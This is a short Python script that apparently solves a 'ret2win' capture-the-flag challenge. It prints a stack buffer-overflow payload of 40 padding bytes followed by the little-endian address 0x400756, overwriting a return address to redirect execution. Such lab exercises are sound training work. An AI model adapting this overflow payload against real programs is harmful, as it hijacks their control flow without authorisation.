#!/usr/bin/python3

import sys

CALL_RET2WIN = 0x400756

def write_ints(dat):
    for v in dat:
        sys.stdout.buffer.write(v.to_bytes(8, byteorder="little"))

def write_call(addr):
    write_ints([addr])

def write_offset():
    sys.stdout.buffer.write(b'A'*40)

write_offset()
write_call(CALL_RET2WIN)
